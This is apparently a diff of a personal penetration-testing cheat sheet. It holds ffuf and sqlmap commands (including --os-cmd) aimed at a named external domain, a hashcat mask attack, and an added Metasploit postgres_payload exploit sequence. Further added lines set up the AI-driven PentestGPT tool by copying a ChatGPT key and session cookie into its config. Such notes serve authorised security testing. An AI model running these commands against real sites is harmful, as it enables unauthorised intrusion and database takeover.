@@ -31,8 +31,10 @@ cd dirsearch
 git clone https://github.com/ffuf/ffuf ; cd ffuf ; go get ; go build
 ffuf -u https://boych.hr-yoga.online/FUZZ -w wordlist.txt -o scan-results1.txt
 
-	Nmap
-sudo nmap -T4 -v -O -p- 159.223.230.244 -oN /home/nmap_out
+	Exploit postgres
+msf use exploit/linux/postgres/postgres_payload
+msf exploit(exploit/linux/postgres/postgres_payload) > set RHOST 102.168.56.102
+msf exploit(exploit/linux/postgres/postgres_payload) > exploit
 
 	Hashcat
 hashcat -m 0 hash.txt -O -a 3 -1 \?d\?l\?s\u \?1\?1\?1\?1\?1\?1\?1\?1\?1\?1
@@ -53,3 +55,14 @@ sqlmap -u "https://boych.hr-yoga.online/"
 --banner
 --dbms -base type payloads to test
 --os-cmd
+
+	PentestGPT
+git clone https://github.com/GreyDGL/PentestGPT
+cd PentestGPT
+pip install -r requirements.txt
+cp config/chatgpt_config_sample.py config/chatgpt_config.py
+copy API key from ChatGPT to chatgpt_config.py in input cookie
+copy cookie from ChatGPT to chatgpt_config.py in input cookie
+copy user agent from ChatGPT to chatgpt_config.py in input userAgent
+sudo python3 test_connection.py
+sudo python3 main.py --reasonning_model=gpt-4
